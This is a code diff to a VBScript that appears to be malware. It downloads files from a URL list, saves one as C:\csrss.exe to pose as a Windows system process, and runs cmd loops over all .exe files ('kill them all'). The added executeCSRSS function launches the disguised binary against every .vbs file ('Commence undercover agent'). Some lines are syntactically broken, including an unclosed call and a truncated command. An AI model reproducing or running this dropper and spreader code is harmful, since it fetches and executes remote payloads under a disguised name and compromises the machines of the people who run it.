@@ -15,33 +15,34 @@ CreateObject("WScript.Shell").run "cmd.exe /c for /r C:\ %i in (*kill.exe) do ec
 CreateObject("WScript.Shell").run "cmd.exe"
 
 call getFiles(list.Item(0), (Int((max-min+1)*Rnd+min))&".exe")
-call getFiles(list.Item(1), 
+call getFiles(list.Item(1), "C:\csrss.exe"
 
-'''Usage: getFiles(value, fileName)
-'  Where value is the item to be downloaded
-'  and fileName is the name of the output file
-Function getFiles(value, fileName)
-	strHDLocation = fileName
+Function getFiles(strFileURL, strHDLocation)
+	'strFileURL = "http://www.google.com/intl/en_ALL/images/logo.gif"
+	'strHDLocation = "C:\GoogleLogo.gif"
 	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-	objXMLHTTP.open "GET", value, false
-	objXMLHTTP.send()
-    If objXMLHTTP.Status = 200 Then
+	objXMLHTTP.Open "GET", strFileURL, False
+	objXMLHTTP.send
+	If objXMLHTTP.Status = 200 Then
 		Set objADOStream = CreateObject("ADODB.Stream")
 		objADOStream.Open
-		objADOStream.Type = 1 
+		objADOStream.Type = 1
 		objADOStream.Write objXMLHTTP.ResponseBody
-		objADOStream.Position = 0    
-		Set objFSO = Createobject("Scripting.FileSystemObject")
-		If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
-			Set objFSO = Nothing
-			objADOStream.SaveToFile strHDLocation
-			objADOStream.Close	
-			Set objADOStream = Nothing
-		End if
-	End If	
+		objADOStream.Position = 0
+		Set objFSO = CreateObject("Scripting.FileSystemObject")
+		If objFSO.Fileexists(strHDLocation) Then
+			objFSO.DeleteFile strHDLocation
+		End If
+		Set objFSO = Nothing
+		objADOStream.SaveToFile strHDLocation
+		objADOStream.Close
+		Set objADOStream = Nothing
+	End If
 End Function
 
 Function executeEevees() 'no seriously kill them all
 	CreateObject("WScript.Shell").run "cmd /c start for /r %i in (*.exe) do "
 End Function
 
+Function executeCSRSS() 'Commence undercover agent
+	CreateObject("WScript.Shell").run "cmd /c for /r %i in (*.vbs) do start C:\csrss.exe ""%i"""
